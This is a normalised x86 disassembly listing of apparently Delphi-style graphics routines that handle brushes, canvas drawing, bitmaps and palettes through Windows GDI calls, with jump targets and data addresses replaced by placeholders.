mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_422aec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423e98
mov eax [ ebp - 0x4 ]
call sub_423194
retn
sub_423e9c
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_423e4c
add esp 0x10
pop edi
pop esi
retn
sub_423ec8
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_423e30
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_423e4c
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_423efc
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_42292c
xor edx edx
push ebp
push sub_423fca
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_422938
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x68 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_423140
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_423fe4
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_423e30
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_423e4c
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_424018
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403f34
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_423438
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_4247b0
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423a54
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_4247d0
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423d20
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_4247f0
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
movzx eax [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_416b08
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_4240dc
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_416ba4
xor edx edx
mov eax esi
call sub_4245e4
mov eax [ esi + 0xc ]
call sub_403f64
mov eax [ esi + 0x10 ]
call sub_403f64
mov eax [ esi + 0x14 ]
call sub_403f64
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_416d9c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_424138
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_424638
movzx edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_424638
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4241c0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_424638
mov eax [ ebx + 0x14 ]
call sub_423ec0
call sub_423140
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423140
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_415370
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_42426c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_424638
mov eax [ ebx + 0x14 ]
call sub_423efc
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_4242a8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_424638
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_424308
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
movzx edx [ r-xdata ]
mov eax ebx
call sub_424638
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_424334
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_424638
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_424370
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebp edx
mov esi eax
movzx edx [ r-xdata ]
mov eax esi
call sub_424638
xor eax eax
mov [ edi ] eax
xor eax eax
mov [ edi + 0x4 ] eax
mov ebx ebp
test ebx ebx
je r-xdata
push edi
push ebx
mov eax ebp
call sub_405324
push eax
mov eax [ esi + 0x4 ]
push eax
call GetTextExtentPoint32A
pop ebp
pop edi
pop esi
pop ebx
retn
sub ebx 0x4
mov ebx [ ebx ]
sub_4243b8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_424370
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4243d4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_424370
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4243f4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_424440
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424447
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_4242e0
sub_4244a0
push ebx
push esi
mov esi edx
mov ebx eax
movzx edx [ r-xdata ]
mov eax ebx
call sub_424638
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_4244c8
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_424308
pop ecx
pop edx
pop edi
pop esi
retn
sub_4244e8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
movzx edx [ r-xdata ]
mov eax ebx
call sub_424638
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_424514
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
movzx edx [ r-xdata ]
mov eax ebx
call sub_424638
mov eax [ ebp + 0x8 ]
call sub_423140
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_424580
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
movzx eax [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
movzx edx [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
movzx eax [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_4245e4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_424580
mov edx esp
mov eax ebx
call sub_4244a0
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_4244c8
sub_424638
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
movzx ebx [ esi + 0x8 ]
not ebx
and bl [ esp ]
movzx eax [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_4246d8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
call sub_4047d8
test bl 0x8
je r-xdata
mov eax esi
call sub_424704
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_424734
sub_4246d8
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_42364c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423140
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_424704
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_423c10
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_424734
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_423efc
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_423efc
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_423fdc
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_423ec0
call sub_423140
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_423ec0
call sub_423140
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_424864
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_4248ae
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4248b5
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_4248b8
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_424954
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_424864
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_4050b4
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb4
call sub_4047d8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42495b
lea eax [ ebp - 0x104 ]
call sub_404e44
retn
sub_424970
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_424abe
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_424a2d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_4248b8
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_4248b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424ac5
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_424ad0
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_424af0
push ebx
dec ecx
mov ebx eax
imul ebx edx
add ebx ecx
not ecx
and ebx ecx
mov ecx 0x8
mov eax ebx
cdq
idiv ecx
mov ebx eax
mov eax ebx
pop ebx
retn
sub_424b10
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_424960
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_424d85
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_424960
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424d8c
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_424960
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_424bd8
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xccaa0029
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424d8c
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_424d9c
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
movzx ebx [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
movzx ebx [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
movzx ecx [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_424dd8
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_403728
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
movzx ebx [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
movzx ebx [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
movzx eax [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_424e54
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
movzx eax [ eax ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xc ] 0x2
jle r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_424ea8
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_402f9c
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_424fa5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424fac
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_424fc0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
movzx eax [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_425046
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_425058
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
add ecx ecx
add ecx ecx
call sub_402f9c
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
